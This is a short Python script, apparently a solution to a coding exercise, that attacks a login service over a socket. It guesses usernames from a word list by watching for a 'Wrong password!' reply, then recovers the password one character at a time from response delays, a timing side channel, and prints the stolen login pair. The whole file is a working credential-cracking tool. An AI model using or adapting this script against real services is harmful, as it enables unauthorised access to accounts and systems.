# write your code here
import socket
import argparse
import itertools
import json
from time import time

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

file = open('logins.txt', 'r')
logins = [i.strip('\n') for i in file.readlines()]

variants = []
for line in logins:
    variants += map(lambda x: ''.join(x), itertools.product(
                        *([letter.lower(), letter.upper()] for letter in line)))

variants_unpacked = iter(variants)


def connect_to_admin(ip, port):
    global variants_unpacked
    correct_login = ""
    correct_password = ""

    with socket.socket() as website_socket:
        hostname = ip
        port = int(port)

        address = (hostname, port)
        website_socket.connect(address)

        for login in logins:
            find_login_request = {"login": "{}".format(login),
                                  "password": " "}
            json_format = json.dumps(find_login_request).encode()
            try:
                website_socket.send(json_format)
            except IOError:
                continue
            except ConnectionResetError:
                continue
            response = website_socket.recv(1024)
            response = response.decode()
            response_json = json.loads(response)
            if response_json["result"] == "Wrong password!":
                correct_login += login
                break

        should_continue = True
        while should_continue:
            for char in chars:
                find_password_request = {"login": "{}".format(correct_login),
                                         "password": "{}".format(correct_password + char)}

                json_format = json.dumps(find_password_request).encode()

                start = time()
                website_socket.send(json_format)
                response = website_socket.recv(1024)
                end = time()
                delay = end - start
                try:
                    response = response.decode()
                    response_json = json.loads(response)
                except Exception:
                    continue
                if delay >= 0.1:
                    correct_password += char
                elif response_json["result"] == "Connection success!":
                    correct_password += char
                    correct_logins = {"login": "{}".format(correct_login),
                                      "password": "{}".format(correct_password)}
                    print(json.dumps(correct_logins))
                    should_continue = False
                    break


parser = argparse.ArgumentParser(description="This program connects the admin website")

parser.add_argument('IP_address')
parser.add_argument('port')

args = parser.parse_args()

connect_to_admin(args.IP_address, args.port)
